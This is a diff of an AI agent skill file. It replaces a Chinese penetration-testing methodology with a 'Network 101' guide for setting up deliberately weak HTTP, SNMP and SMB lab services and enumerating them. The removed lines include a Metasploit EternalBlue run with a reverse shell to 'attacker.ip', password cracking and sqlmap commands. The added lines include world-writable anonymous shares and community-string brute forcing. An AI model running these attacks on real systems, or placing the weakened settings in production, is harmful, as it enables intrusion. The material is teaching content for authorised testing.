@@ -1,14 +1,14 @@
 ---
 name: penetration-testing-methodology
-title: 渗透测试全生命周期
-description: 当在授权范围内对目标系统做安全评估、需要一套从信息收集到报告的端到端渗透方法论时使用；按侦察→扫描→漏洞分析→利用→权限维持→报告的阶段推进，产出侦察清单、漏洞评估、PoC 证据与含风险分级的最终报告；不适用于无书面授权的测试、超范围攻击或恶意入侵。触发词：渗透测试、漏洞评估、Kali/Nmap/Metasploit、安全评估报告。
+title: Network 101
+description: Configure and test common network services (HTTP, HTTPS, SNMP, SMB) for penetration testing lab environments. Enable hands-on practice with service enumeration, log analysis, and security testing against properly configured target systems.
 domain: 安全/audit
-triggers: [渗透测试, 漏洞评估, 安全评估, Kali Linux, Nmap 扫描, Metasploit, 提权, 渗透测试报告, OWASP 测试, 授权安全测试]
-tags: [安全, 渗透测试, misc, 红队, 漏洞评估, 方法论]
-level: 进阶
+triggers: [Kali Linux, Metasploit]
+tags: [misc]
+level: intermediate
 status: stable
 agents: [claude-code, codex, cursor, gemini-cli]
-tools: [Nmap, theHarvester, Nikto, Gobuster, Metasploit, SQLMap, Hydra, John the Ripper, LinPEAS/WinPEAS]
+tools: []
 requires: []
 related: [red-team-recon, cloud-penetration-testing, linux-privilege-escalation, active-directory-attacks]
 combines_with: [red-team-recon, burp-suite-testing, security-audit-toolkit]
@@ -16,125 +16,340 @@ license: MIT
 source: sickn33/antigravity-awesome-skills
 source_license: MIT
 ---
-> 仅限授权使用：本技能仅可用于已获书面授权的渗透测试、防御性验证或受控教学环境。任何无授权、超范围的测试均属违法。
+# Network 101
 
-## 何时使用
+## Purpose
 
-适用于以下场景：
-- 已取得系统所有者**书面授权**，需要对目标做端到端的渗透/安全评估。
-- 需要一套可复用的阶段化方法论（侦察→扫描→漏洞分析→利用→权限维持→报告）来组织工作并交付证据。
-- 防御方做漏洞复现验证，或在隔离靶场做教学演练。
+Configure and test common network services (HTTP, HTTPS, SNMP, SMB) for penetration testing lab environments. Enable hands-on practice with service enumeration, log analysis, and security testing against properly configured target systems.
 
-**不该用（负边界）：**
-- 没有书面授权、或目标不在授权范围内 —— 任何操作前先确认 scope 与 rules of engagement。
-- 生产环境上未经审批的破坏性操作（DoS、删改数据、留后门）。
-- 把测试中获取的数据/凭据用于个人目的或对外披露。
-- 仅需写一份安全策略文档、做合规审计或代码审计 —— 那属于其他技能范畴。
+## Inputs/Prerequisites
 
-**前置条件**：基础网络与 Linux 命令行能力、Web 技术常识；一套测试平台（如 Kali Linux）与到授权目标的网络可达性。
+- Windows Server or Linux system for hosting services
+- Kali Linux or similar for testing
+- Administrative access to target system
+- Basic networking knowledge (IP addressing, ports)
+- Firewall access for port configuration
 
-## 步骤
+## Outputs/Deliverables
 
-1. **侦察（被动为主）**：不直接接触目标，收集域名、子域、邮箱、技术栈、人员等情报，产出侦察清单。
-2. **扫描（主动枚举）**：探活、端口扫描、服务识别，绘制攻击面。
-3. **漏洞分析**：结合自动化扫描与手工验证，对照 OWASP/CVE 定位可利用弱点，产出漏洞评估。
-4. **利用**：在授权与范围内验证漏洞可被利用，留存最小化的 PoC 证据（截图、请求/响应、命令输出）。
-5. **权限维持/提权（受控）**：仅在授权允许时演示持久化与提权，全程记录，测试后清理所有植入物。
-6. **报告**：按执行摘要 + 技术发现 + 风险分级 + 修复建议 + 附录结构交付最终报告。
+- Configured HTTP/HTTPS web server
+- SNMP service with accessible communities
+- SMB file shares with various permission levels
+- Captured logs for analysis
+- Documented enumeration results
 
-全程原则：能被动则不主动、能只读则不写、所有动作可追溯、不做计划外测试。
+## Core Workflow
 
-## 指令
+### 1. Configure HTTP Server (Port 80)
 
-**阶段一 · 侦察（被动）**
+Set up a basic HTTP web server for testing:
+
+**Windows IIS Setup:**
+1. Open IIS Manager (Internet Information Services)
+2. Right-click Sites → Add Website
+3. Configure site name and physical path
+4. Bind to IP address and port 80
+
+**Linux Apache Setup:**
+
 ```bash
-# WHOIS 与 DNS 枚举
-whois target.com
-dig target.com ANY; dig target.com MX; dig target.com NS
-dnsrecon -d target.com          # 子域发现
-theHarvester -d target.com -b all   # 邮箱/资产收集
-```
-Google Hacking（OSINT）常用语法：
-```
-site:target.com filetype:pdf        # 暴露的文件
-site:target.com inurl:admin         # 后台/登录页
-site:target.com intitle:"index of"  # 目录列表
-site:target.com filetype:env        # 配置/密钥泄露
-```
-社媒侦察：LinkedIn（组织架构/技术栈）、招聘信息（技术栈）、Twitter/Facebook（人员信息）。
+# Install Apache
+sudo apt update && sudo apt install apache2
 
-**阶段二 · 扫描**
+# Start service
+sudo systemctl start apache2
+sudo systemctl enable apache2
+
+# Create test page
+echo "<html><body><h1>Test Page</h1></body></html>" | sudo tee /var/www/html/index.html
+
+# Verify service
+curl http://localhost
+```
+
+**Configure Firewall for HTTP:**
+
 ```bash
-nmap -sn 192.168.1.0/24         # 探活（ping sweep）
-nmap -sS target.com             # SYN 半开扫描（隐蔽）
-nmap -p- target.com             # 全端口
-nmap -sV target.com             # 服务/版本识别
-nmap -A target.com              # 激进：OS+版本+脚本
-nmap --script=vuln target.com   # 漏洞脚本
-```
-常见端口速查：21 FTP、22 SSH、23 Telnet、25 SMTP、53 DNS、80 HTTP、443 HTTPS、445 SMB、3306 MySQL、3389 RDP。
+# Linux (UFW)
+sudo ufw allow 80/tcp
 
-**阶段三 · 漏洞分析**
+# Windows PowerShell
+New-NetFirewallRule -DisplayName "HTTP" -Direction Inbound -Protocol TCP -LocalPort 80 -Action Allow
+```
+
+### 2. Configure HTTPS Server (Port 443)
+
+Set up secure HTTPS with SSL/TLS:
+
+**Generate Self-Signed Certificate:**
+
 ```bash
-nikto -h http://target.com      # Web 漏洞扫描
-gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt  # 目录爆破
-whatweb target.com              # 技术指纹
-```
-Web 重点（OWASP）：SQL 注入、XSS、失效的认证/访问控制、安全配置错误、敏感数据暴露、XXE、不安全反序列化、已知漏洞组件、日志监控不足。
+# Linux - Generate certificate
+sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
+  -keyout /etc/ssl/private/apache-selfsigned.key \
+  -out /etc/ssl/certs/apache-selfsigned.crt
 
-**阶段四 · 利用**
+# Enable SSL module
+sudo a2enmod ssl
+sudo systemctl restart apache2
+```
+
+**Configure Apache for HTTPS:**
+
 ```bash
-# Metasploit
-msfconsole
-msf> search type:exploit name:smb
-msf> use exploit/windows/smb/ms17_010_eternalblue
-msf> set RHOSTS target.com
-msf> set PAYLOAD windows/meterpreter/reverse_tcp
-msf> set LHOST attacker.ip
-msf> exploit
+# Edit SSL virtual host
+sudo nano /etc/apache2/sites-available/default-ssl.conf
 
-# 口令攻击
-hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com
-john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
-
-# SQL 注入
-sqlmap -u "http://target.com/page.php?id=1" --dbs
-sqlmap -u "http://target.com/page.php?id=1" -D database --tables
+# Enable site
+sudo a2ensite default-ssl
+sudo systemctl reload apache2
 ```
 
-**阶段五 · 权限维持/提权（受控，须授权）**
+**Verify HTTPS Setup:**
+
 ```bash
-# 提权枚举
-linpeas.sh / winpeas.exe
-find / -perm -4000 2>/dev/null   # SUID 二进制
-sudo -l                          # sudo 权限
+# Check port 443 is open
+nmap -p 443 192.168.1.1
+
+# Test SSL connection
+openssl s_client -connect 192.168.1.1:443
+
+# Check certificate
+curl -kv https://192.168.1.1
 ```
-持久化（仅在授权允许时演示，测试后必须清理）：Meterpreter persistence、SSH authorized_keys、cron 任务。**伦理语境下的「清理痕迹」= 记录全部动作、保留日志供报告、移除测试文件与后门、不做不必要的系统改动。**
 
-## 示例
+### 3. Configure SNMP Service (Port 161)
 
-授权内网评估的最小闭环：
-1. 侦察：`theHarvester -d acme.com -b all` 收集邮箱与子域，记录到侦察清单。
-2. 扫描：`nmap -sV -p- 10.0.0.0/24`，发现 10.0.0.5 开放 445/SMB。
-3. 分析：`nmap --script=vuln 10.0.0.5` 提示疑似 MS17-010。
-4. 利用：Metasploit 加载 `ms17_010_eternalblue`，设好 RHOSTS/LHOST 后 `exploit`，获取会话并**截图留证**。
-5. 报告：将该项判为 Critical（需立即处置），给出补丁/隔离建议，证据归入技术发现章节。
+Set up SNMP for enumeration practice:
 
-风险分级参考：Critical 立即处置｜High 24-48h｜Medium 一周内｜Low 一月内｜Informational 最佳实践建议。
+**Linux SNMP Setup:**
 
-## 注意事项
+```bash
+# Install SNMP daemon
+sudo apt install snmpd snmp
 
-- **授权先行**：无书面授权不测试；严格不越界；发现越权访问迹象立即上报。
-- **范围与规则**：遵守 rules of engagement，只执行计划内测试，不做计划外动作。
-- **证据与保密**：完整记录方法与时间线，所有发现仅向客户披露，对访问到的数据保密。
-- **最小破坏**：避免不必要的系统损坏；测试结束清理后门、测试文件与临时配置。
-- **故障排查**：扫描被拦 → 降速、换技术、用代理/VPN、分片报文；利用失败 → 先核实漏洞确实存在、检查 payload 兼容性、调参或换备选 exploit。
+# Configure community strings
+sudo nano /etc/snmp/snmpd.conf
 
-## 互见
+# Add these lines:
+# rocommunity public
+# rwcommunity private
 
-- 报告与风险分级章节可衔接「漏洞披露 / 修复跟踪」类技能。
-- Web 专项（SQL 注入、XSS、访问控制）可下钻到对应的 OWASP 测试技能。
-- 平台搭建（Kali 硬盘安装 / Live USB 持久化，如 `dd if=kali-linux.iso of=/dev/sdb bs=512k status=progress`）可参见环境配置类技能。
+# Restart service
+sudo systemctl restart snmpd
+```
 
----
-采编自 sickn33/antigravity-awesome-skills（原 skill：ethical-hacking-methodology，作者 zebbern，MIT 许可）。
+**Windows SNMP Setup:**
+1. Open Server Manager → Add Features
+2. Select SNMP Service
+3. Configure community strings in Services → SNMP Service → Properties
+
+**SNMP Enumeration Commands:**
+
+```bash
+# Basic SNMP walk
+snmpwalk -c public -v1 192.168.1.1
+
+# Enumerate system info
+snmpwalk -c public -v1 192.168.1.1 1.3.6.1.2.1.1
+
+# Get running processes
+snmpwalk -c public -v1 192.168.1.1 1.3.6.1.2.1.25.4.2.1.2
+
+# SNMP check tool
+snmp-check 192.168.1.1 -c public
+
+# Brute force community strings
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 192.168.1.1
+```
+
+### 4. Configure SMB Service (Port 445)
+
+Set up SMB file shares for enumeration:
+
+**Windows SMB Share:**
+1. Create folder to share
+2. Right-click → Properties → Sharing → Advanced Sharing
+3. Enable sharing and set permissions
+4. Configure NTFS permissions
+
+**Linux Samba Setup:**
+
+```bash
+# Install Samba
+sudo apt install samba
+
+# Create share directory
+sudo mkdir -p /srv/samba/share
+sudo chmod 777 /srv/samba/share
+
+# Configure Samba
+sudo nano /etc/samba/smb.conf
+
+# Add share:
+# [public]
+#    path = /srv/samba/share
+#    browsable = yes
+#    guest ok = yes
+#    read only = no
+
+# Restart service
+sudo systemctl restart smbd
+```
+
+**SMB Enumeration Commands:**
+
+```bash
+# List shares anonymously
+smbclient -L //192.168.1.1 -N
+
+# Connect to share
+smbclient //192.168.1.1/share -N
+
+# Enumerate with smbmap
+smbmap -H 192.168.1.1
+
+# Full enumeration
+enum4linux -a 192.168.1.1
+
+# Check for vulnerabilities
+nmap --script smb-vuln* 192.168.1.1
+```
+
+### 5. Analyze Service Logs
+
+Review logs for security analysis:
+
+**HTTP/HTTPS Logs:**
+
+```bash
+# Apache access log
+sudo tail -f /var/log/apache2/access.log
+
+# Apache error log
+sudo tail -f /var/log/apache2/error.log
+
+# Windows IIS logs
+# Location: C:\inetpub\logs\LogFiles\W3SVC1\
+```
+
+**Parse Log for Credentials:**
+
+```bash
+# Search for POST requests
+grep "POST" /var/log/apache2/access.log
+
+# Extract user agents
+awk '{print $12}' /var/log/apache2/access.log | sort | uniq -c
+```
+
+## Quick Reference
+
+### Essential Ports
+
+| Service | Port | Protocol |
+|---------|------|----------|
+| HTTP | 80 | TCP |
+| HTTPS | 443 | TCP |
+| SNMP | 161 | UDP |
+| SMB | 445 | TCP |
+| NetBIOS | 137-139 | TCP/UDP |
+
+### Service Verification Commands
+
+```bash
+# Check HTTP
+curl -I http://target
+
+# Check HTTPS
+curl -kI https://target
+
+# Check SNMP
+snmpwalk -c public -v1 target
+
+# Check SMB
+smbclient -L //target -N
+```
+
+### Common Enumeration Tools
+
+| Tool | Purpose |
+|------|---------|
+| nmap | Port scanning and scripts |
+| nikto | Web vulnerability scanning |
+| snmpwalk | SNMP enumeration |
+| enum4linux | SMB/NetBIOS enumeration |
+| smbclient | SMB connection |
+| gobuster | Directory brute forcing |
+
+## Constraints
+
+- Self-signed certificates trigger browser warnings
+- SNMP v1/v2c communities transmit in cleartext
+- Anonymous SMB access is often disabled by default
+- Firewall rules must allow inbound connections
+- Lab environments should be isolated from production
+
+## Examples
+
+### Example 1: Complete HTTP Lab Setup
+
+```bash
+# Install and configure
+sudo apt install apache2
+sudo systemctl start apache2
+
+# Create login page
+cat << 'EOF' | sudo tee /var/www/html/login.html
+<html>
+<body>
+<form method="POST" action="login.php">
+Username: <input type="text" name="user"><br>
+Password: <input type="password" name="pass"><br>
+<input type="submit" value="Login">
+</form>
+</body>
+</html>
+EOF
+
+# Allow through firewall
+sudo ufw allow 80/tcp
+```
+
+### Example 2: SNMP Testing Setup
+
+```bash
+# Quick SNMP configuration
+sudo apt install snmpd
+echo "rocommunity public" | sudo tee -a /etc/snmp/snmpd.conf
+sudo systemctl restart snmpd
+
+# Test enumeration
+snmpwalk -c public -v1 localhost
+```
+
+### Example 3: SMB Anonymous Access
+
+```bash
+# Configure anonymous share
+sudo apt install samba
+sudo mkdir /srv/samba/anonymous
+sudo chmod 777 /srv/samba/anonymous
+
+# Test access
+smbclient //localhost/anonymous -N
+```
+
+## Troubleshooting
+
+| Issue | Solution |
+|-------|----------|
+| Port not accessible | Check firewall rules (ufw, iptables, Windows Firewall) |
+| Service not starting | Check logs with `journalctl -u service-name` |
+| SNMP timeout | Verify UDP 161 is open, check community string |
+| SMB access denied | Verify share permissions and user credentials |
+| HTTPS certificate error | Accept self-signed cert or add to trusted store |
+| Cannot connect remotely | Bind service to 0.0.0.0 instead of localhost |
+
+## When to Use
+This skill is applicable to execute the workflow or actions described in the overview.
